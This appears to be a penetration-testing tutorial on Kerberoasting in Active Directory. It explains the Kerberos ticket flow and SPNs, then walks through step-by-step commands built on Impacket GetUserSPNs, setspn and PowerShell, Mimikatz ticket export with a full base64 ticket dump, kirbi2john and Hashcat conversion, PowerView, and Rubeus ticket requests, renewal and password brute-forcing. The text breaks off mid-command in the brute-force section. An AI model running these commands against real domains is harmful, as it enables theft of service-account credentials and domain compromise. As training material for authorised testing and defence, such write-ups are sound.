\n![1.webp](https://1.bp.blogspot.com/-XHZj0n9oH_g/XrHWMs_s-uI/AAAAAAAAj2E/oxSrDD2wvOEMv-a-nTHhQD2jc-3KMULYgCLcBGAsYHQ/s1600/1.png)\n        \nKerberos uses symmetric cryptography for encryption and decryption.\n        \nFor explanation purposes, we use three colours to distinguish Hashes:\n        \n- **BLUE _KEY**: User NTLM HASH\n- **YELLOW_KEY**: Krbtgt NTLM HASH\n- **RED_KEY:** Service NTLM HASH\n        \n**Step 1:** By sending the request message to KDC, the client initializes communication as:\n        \n***KRB_AS_REQ contains the following:***\n        \n- The username of the client is to be authenticated.\n- *The service **SPN (SERVICE PRINCIPAL NAME)** linked with the Krbtgt account*\n- *An encrypted timestamp (Locked with User Hash: Blue Key)*\n        \nThe entire message is encrypted using the User NTLM hash (**Locked with BLUE KEY**) to authenticate the user and prevent replay attacks.\n        \n**Step 2:** The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message (**Unlock with BLUE KEY**) that authenticates user identification.\n        \nThen KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) & some Encrypted Message using User Hash.\n        \n***KRB_AS_REP contains the following:***\n        \n- ***Username***\n- *Some encrypted data, (Locked with User Hash: Blue Key) that contains:*\n- *Session key*\n- *The expiration date of TGT*\n- ***TGT**, (Locked with Krbtgt Hash: Yellow Key) which contains:*\n- *Username*\n- *Session key*\n- *The expiration date of TGT*\n- *PAC with user privileges, signed by KDC*\n        \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1)\n        \n**Step 3:** The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.\n        \n***KRB_TGS_REQ** contains:*\n        \n- *Encrypted data with the session key*\n- *Username*\n- *Timestamp*\n- *TGT*\n- *SPN of requested service e.g. SQL service*\n        \n**Step 4:** The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash **(Locked with Red Key)** & Some Encrypted Message using User Hash.\n        \n***KRB_TGS_REP contains:***\n        \n- *Username*\n- *Encrypted data with the session key:*\n- *Service session key*\n- *The expiration date of TGS*\n- ***TGS**, (Service Hash: RED Key) which contains:*\n- *Service session key*\n- *Username*\n- *The expiration date of TGS*\n- *PAC with user privileges, signed by KDC*\n        \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1)\n        \n**Step 5:** The user sends the copy of TGS to the Application Server,\n        \n***KRB_AP_REQ contains:***\n        \n- *TGS*\n- *Encrypted data with the service session key:*\n- *Username*\n- *Timestamp, to avoid replay attacks*\n        \n**Step 6:** The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.\n        \n**Step 7:**  KDC verifies PAC (Optional)\n        \n**Step 8:**  Allow the user to access the service for a specific time.\n        \n## SPNs\n        \nThe Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.\n        \n**Important Points**\n        \n- If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN.\n- Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.\n- A given SPN can be registered on only one account.\n- An SPN must be unique in the forest in which it is registered.\n- If it is not unique, authentication will fail.\n\n### SPNS syntax\n\n**The SPN syntax has four elements**\n        \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1)\n        \n### Type of SPN\n        \n- Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks\n- SPNs that have been associated with a domain user account where NTLM hash will be used.\n\n\n### Linux Perspective\n        \n        \n#### Attack Procedure.\n       \nDepending on your positioning a network, Kerberos attacks can be performed in multiple ways.\n        \n- From a non-domain joined Linux host using valid domain user credentials.\n- From a domain-joined Linux host as root after retrieving the keytab file.\n- From a domain-joined Windows, the host is authenticated as a domain user.\n- From a domain-joined Windows host with a shell in the context of a domain account.\n- As SYSTEM on a domain-joined Windows host.\n- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.\n        \n#### Tools.\n        \nSome tools can be utilized to perform the attack.\n        \n- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.\n- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.\n- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.\n        \n        \n**********************REMEMBER!!!**********************\n\nObtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.\n        \nTGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.\n        \n\n        \n#### The efficiency of Attack\n        \nWhile it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.\n        \nWe might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.\n        \n**N/B -** When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.\n        \n        \n**********************REMEMBER!!!**********************\n        \nA prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.\n        \n\n#### GetUserSPNs.py\n        \n**Listing SPN Accounts.**\n        \n`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`\n        \n#### Requesting all TGS tickets.**\n        \nLater on, we can pull all TGS tickets for offline processing using the **-request** flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.\n        \n`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`\n        \n#### Requesting a Single TGS Ticket.\n        \nWte can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the required account.\n        \n`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user`\n        \nWith this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.\n        \nSaving the Ticket o facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.\n        \n`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`\n        \n### Windows Perspective\n        \nKerberoasting - Semi-Manual Method.\n        \n#### Enumerating SPNs with setspn.exe\n        \n`setspn.exe -Q */*` running the command you’ll notice many different SPNs returned for the various hosts in the domain.\n        \n#### Retrieving All Tickets using setspn.exe\n        \n`setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`\n        \nThe above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.\n        \nUsing ******************Powershell****************** we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using **Mimkatz.**\n        \n#### Targeting a Single User**************\n        \n```powershell\nPS C:\\htb> Add-Type -AssemblyName System.IdentityModel\nPS C:\\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"\n```\n        \nBefore moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):\n        \n- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object\n- The `AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using\n- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services\n- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object\n- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session\n        \nWe can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.\n        \nNow that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.\n        \n### Extracting Tickets from Memory with Mimikatz\n        \n```powershell\n        Using 'mimikatz.log' for logfile : OK\n        \n        mimikatz # base64 /out:true\n        isBase64InterceptInput  is false\n        isBase64InterceptOutput is true\n        \n        mimikatz # kerberos::list /export\n        \n        <SNIP>\n        \n        [00000002] - 0x00000017 - rc4_hmac_nt\n           Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM\n           Server Name: MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL\n           Client Name: htb-student @ INLANEFREIGHT.LOCAL\n           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;\n        ====================\n        Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi\n        ====================\n        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\n        ZWZyZWlnaHQubG9jYWw6MTQzMw==\n        ====================\n        \n           * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi\n```\n        \nIf we don’t specify the **base64 /out:true** command, Mimikatz will extract the tickets and write the to **.kirbi** files. \n        \n Next, you prepare the base blob for cracking `echo \"<base64 blob>\" |  tr -d \\\\n` then place the above into a file and convert it back to a **.kirbi** file using the base64 utility.`cat encoded_file | base64 -d > sqldev.kirbi`\n        \n Extract the kerberos ticket using [kirbi2john.py](http://kirbi2john.py) this will create a file called **crack_file,** which then must be modified to be able to use Hashcat against the hash `python2.7 kirbi2john.py sqldev.kirbi`\n        \nModifying the crack file for hashcat `sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file > sqldev_tgs_hashcat` now you can run the ticket through hashcat and get a clear password.\n        \n#### Skipped Version\n        \nSo if we decide to skip the base64 output with mimkatz and type **mimikatz # kerberos::list /export,** the **.kirbi** file will be written to disk, in this case, you can download the file and run **[kirbi2john.py](http://kirbi2john.py)** against them directly, skipping the base64 decoding step.\n        \n#### AUTOMATE VERSION\n        \nUsing [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the TGS ticket and convert them to Hashcat format.\n        \n**Extracting TGS Ticket**\n        \n```powershell\n        PS C:\\htb> Import-Module .\\PowerView.ps1\n        PS C:\\htb> Get-DomainUser * -spn | select samaccountname\n        PS C:\\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n```\n        \n**Target Specific User**\n        \n`Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`\n        \n**Exporting All Tickets to a CSV file and viewing the Content**\n        \n`Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation`\n        \n`cat .\\ilfreight_tgs.csv`\n        \n## REBEUS\n            \n[https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)\n            \nA tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos\n            \n[https://www.hackingarticles.in/a-detailed-guide-on-rubeus/](https://www.hackingarticles.in/a-detailed-guide-on-rubeus/)\n            \n### **Ticket Operations**\n            \nWorking in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.\n            \nIn this section, we’ll talk about Rubeus and its capability to play around with tickets.\n            \n#### Asktgt\n            \nRubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied\n            \n`rubeus.exe asktgt /user:harshitrajpal /password: Password@1`\n            \n ![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1)\n            \nAs you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.\n            \n`rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1)\n            \n**Asktgs**\n            \nRubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.\n            \nFor example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.\n            \n`rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local`            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1)\n            \nBy providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1)\n            \n### Klist\n            \nKlist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1)\n            \n### Renew\n            \nThe renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the /dc flag which will be used as a destination for the renewal traffic. We can further use the **tgtdeleg** option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.\n            \n**/ptt** flag can also be used in conjunction to apply the Kerberos\n            \n`rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1)\n            \n**/autorenew** sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket\n            \n`rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==`\n            \n ![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1)\n            \nAs you may now observe that after a specified time interval a renewed TGT is shown\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1)\n            \n**Brute**\n            \nThe brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. /noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,\n            \n`rubeus.exe brute /password:Password@1 